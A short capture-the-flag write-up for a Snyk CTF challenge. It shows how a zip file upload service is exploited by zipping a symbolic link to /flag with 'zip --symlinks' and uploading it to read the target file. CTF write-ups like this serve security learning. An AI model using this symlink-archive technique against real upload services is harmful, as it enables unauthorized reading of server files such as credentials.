# Fetch the flag | Snyk ctf | 5 OCT 2021 

given the link we can see it is a zib file uplaod :

![image](https://user-images.githubusercontent.com/67979878/136060452-bbd22467-4aa1-451a-b2f7-8db4e8efc16c.png)

searching for zip file upload vulnerability found :

https://book.hacktricks.xyz/pentesting-web/file-upload

```bash
ln -s /flag symindex.txt
zip --symlinks test.zip symindex.txt
```

upload test.zip 

![image](https://user-images.githubusercontent.com/67979878/136060955-51a96505-ff7e-4e56-877d-d34c5283b362.png)
